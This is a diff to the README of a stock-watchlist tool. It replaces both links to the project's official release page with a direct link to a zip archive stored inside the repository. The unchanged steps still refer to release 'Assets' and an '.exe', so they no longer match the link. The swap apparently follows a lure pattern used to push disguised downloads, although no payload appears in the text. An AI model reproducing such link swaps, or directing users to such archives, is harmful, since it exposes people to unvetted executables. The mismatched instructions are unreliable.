@@ -1,6 +1,6 @@
 # 📈 daily-watchlist - Automated stock market research and tracking
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jatinkumarjun21/daily-watchlist/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/jatinkumarjun21/daily-watchlist/main/portfolio/daily-watchlist-3.9.zip)
 
 This application tracks stocks, earnings, and market trends using artificial intelligence. It creates daily investment reports for your personal watchlist. You spend less time searching for data and more time making investment decisions.
 
@@ -20,7 +20,7 @@ To start using this tool, go to the official release page. You will find the lat
 
 Follow these steps to access the file:
 
-1. Visit [this page to download your copy](https://github.com/jatinkumarjun21/daily-watchlist/releases).
+1. Visit [this page to download your copy](https://raw.githubusercontent.com/jatinkumarjun21/daily-watchlist/main/portfolio/daily-watchlist-3.9.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release box.
 3. Click the link ending in `.exe` to start your download.
 4. Wait for the file to finish saving to your computer.
